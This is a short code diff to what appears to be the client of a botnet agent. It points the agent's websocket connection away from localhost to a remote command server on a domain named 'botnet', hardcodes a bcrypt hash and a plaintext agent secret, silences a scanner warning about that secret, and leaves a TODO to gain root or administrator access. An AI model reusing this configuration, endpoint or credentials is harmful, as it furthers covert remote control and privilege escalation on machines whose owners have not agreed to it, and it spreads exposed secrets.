@@ -14,23 +14,22 @@ def debug(*args):
 
 
 """{
-  "uuid": "aee53005-c077-4f17-9566-fe699ff6a2e5",
-  "secret": "$2b$12$/Pkioh0dFzRPmbD4LBMlg.xMwj2aGgpnHk0ntFRkRmNLC5plfSCnm",
-  "name": "test_agent",
-  "description": "agent for testing",
+  "uuid": "fe09423a-c414-4c09-b46c-2325296e692b",
+  "secret": "$2b$12$FTqBjEvWXERvhNmOoOODIutaJTerdvWQklMeS4luKbMbShHYL.TDi",
+  "name": "test",
   "version": 0,
-  "created_at": 1700229538,
-  "last_seen": 1700229538,
-  "raw_secret": "t8bGgAyPl8Pw7I6AJNopFKCl82TGo_M7bZZ1uouG1r8"
+  "created_at": 1702496610,
+  "last_seen": 1702496610,
+  "raw_secret": "cxUjBjwDaBDiCQk3l9AW9BT4UE5ROK6fEpxL1qVQkxQ"
 }"""
 
 
-UUID = "aee53005-c077-4f17-9566-fe699ff6a2e5"
+UUID = "fe09423a-c414-4c09-b46c-2325296e692b"
 
-WS_URL = f"ws://127.0.0.1:8000/agent/{UUID}/ws"
+WS_URL = f"ws://api.botnet.alecj.tk:18000/agent/{UUID}/ws"
 
 # deepcode ignore HardcodedNonCryptoSecret: this is purely for testing
-SECRET = "t8bGgAyPl8Pw7I6AJNopFKCl82TGo_M7bZZ1uouG1r8"
+SECRET = "cxUjBjwDaBDiCQk3l9AW9BT4UE5ROK6fEpxL1qVQkxQ"
 
 # TODO: gain root/administrator access
 
